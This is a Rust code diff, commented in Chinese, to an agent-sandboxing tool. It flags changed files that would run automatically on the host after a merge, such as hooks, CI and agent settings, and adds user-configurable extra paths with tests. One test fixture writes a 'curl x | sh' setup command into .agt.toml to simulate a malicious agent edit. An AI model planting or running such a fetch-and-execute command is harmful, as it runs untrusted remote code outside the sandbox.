@@ -854,7 +854,14 @@ fn new_gitlinks(repo: &Path, worktree: &Path) -> Result<Vec<String>> {
 /// branch 相對 base 變更過的檔案中，合併後會在主機或 CI 上**自動執行**的設定檔
 /// （hooks、CI workflow、編輯器 task、agt 的 setup 等）。收尾前要讓使用者再確認一次：
 /// 沙箱裡的 Agent 改不到主機，但這些檔案一旦合併就等於在沙箱外執行它寫的內容。
-pub fn sensitive_changes(repo: &Path, worktree: &Path, base: &str) -> Result<Vec<String>> {
+///
+/// `extra`：使用者追加的路徑（設定 `general.sensitive_paths`），規則見 [`matches_extra`]。
+pub fn sensitive_changes(
+    repo: &Path,
+    worktree: &Path,
+    base: &str,
+    extra: &[String],
+) -> Result<Vec<String>> {
     let out = git_wt(
         repo,
         worktree,
@@ -868,9 +875,30 @@ pub fn sensitive_changes(repo: &Path, worktree: &Path, base: &str) -> Result<Vec
     )?;
     Ok(out
         .split('\0')
-        .filter(|p| is_sensitive_path(p))
+        .filter(|p| is_sensitive_path(p) || matches_extra(p, extra))
         .map(str::to_string)
         .collect())
+}
+
+/// 使用者追加的示警路徑（不分大小寫）：
+/// - 以 `/` 結尾：該目錄底下的所有檔案，例如 `scripts/`
+/// - 含有 `/`：repo 根目錄起算的完整路徑，例如 `tools/build.sh`
+/// - 其他：任何目錄下同名的檔案，例如 `package.json`、`Makefile`
+pub fn matches_extra(path: &str, extra: &[String]) -> bool {
+    let p = path.to_ascii_lowercase();
+    let name = p.rsplit('/').next().unwrap_or(&p);
+    extra.iter().any(|e| {
+        let e = e.trim().trim_start_matches("./").to_ascii_lowercase();
+        if e.is_empty() {
+            false
+        } else if e.ends_with('/') {
+            p.starts_with(&e)
+        } else if e.contains('/') {
+            p == e
+        } else {
+            name == e
+        }
+    })
 }
 
 /// 見 [`sensitive_changes`]。路徑以 repo 根目錄為準、用 `/` 分隔。
@@ -1458,15 +1486,51 @@ mod tests {
         add_worktree(root, &wt, "agt/t/s-000010", "main").unwrap();
         std::fs::write(wt.join("ok.txt"), "x").unwrap();
         assert!(commit_all(root, &wt, "ok").unwrap());
-        assert!(sensitive_changes(root, &wt, "main").unwrap().is_empty());
+        assert!(
+            sensitive_changes(root, &wt, "main", &[])
+                .unwrap()
+                .is_empty()
+        );
         std::fs::write(wt.join(".agt.toml"), "setup = \"curl x | sh\"\n").unwrap();
         std::fs::create_dir_all(wt.join(".claude")).unwrap();
         std::fs::write(wt.join(".claude/settings.json"), "{}").unwrap();
         assert!(commit_all(root, &wt, "evil").unwrap());
         assert_eq!(
-            sensitive_changes(root, &wt, "main").unwrap(),
+            sensitive_changes(root, &wt, "main", &[]).unwrap(),
             [".agt.toml", ".claude/settings.json"]
         );
+        // 使用者追加的路徑
+        assert!(
+            sensitive_changes(root, &wt, "main", &["ok.txt".into()])
+                .unwrap()
+                .contains(&"ok.txt".to_string())
+        );
+    }
+
+    #[test]
+    fn extra_sensitive_paths() {
+        let extra: Vec<String> = [
+            "package.json",
+            "scripts/",
+            "tools/build.sh",
+            "  ",
+            "./Makefile",
+        ]
+        .map(String::from)
+        .to_vec();
+        for p in [
+            "package.json",
+            "web/package.json",
+            "scripts/x.sh",
+            "tools/build.sh",
+            "Makefile",
+        ] {
+            assert!(matches_extra(p, &extra), "{p}");
+        }
+        for p in ["src/scripts.rs", "other/tools/build.sh", "package.json.bak"] {
+            assert!(!matches_extra(p, &extra), "{p}");
+        }
+        assert!(!matches_extra("anything", &[]));
     }
 
     #[test]
